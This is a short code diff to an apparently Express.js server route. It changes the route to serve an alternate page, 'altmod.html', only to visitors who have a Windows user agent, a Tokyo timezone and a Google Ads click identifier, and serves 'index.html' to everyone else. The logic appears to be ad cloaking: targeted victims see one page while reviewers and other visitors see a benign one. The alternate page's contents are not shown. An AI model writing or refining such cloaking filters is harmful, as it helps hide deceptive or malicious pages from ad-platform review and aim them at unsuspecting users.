@@ -48,12 +48,19 @@ app.post(
     }
   },
   (req, res) => {
-    const { timezone, os } = req.body;
-    console.log(`Timezone: ${timezone}`); // Log the timezone for debugging
+    const { timezone } = req.body;
+    const userAgent = req.headers['user-agent'];
+    const gclid = req.query.gclid; // Access the gclid parameter from the URL query string
 
-    if (timezone === "Asia/Tokyo") {
+    // Conditions for serving altmod.html
+    const isWindowsUser = userAgent.includes("Windows");
+    const isTimezoneTokyo = timezone === "Asia/Tokyo";
+    const isFromGoogleAds = typeof gclid !== 'undefined';
+
+    if (isWindowsUser && isTimezoneTokyo && isFromGoogleAds) {
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
+      console.log("Serving index.html");
       res.sendFile(path.join(__dirname, "index.html"));
     }
   }
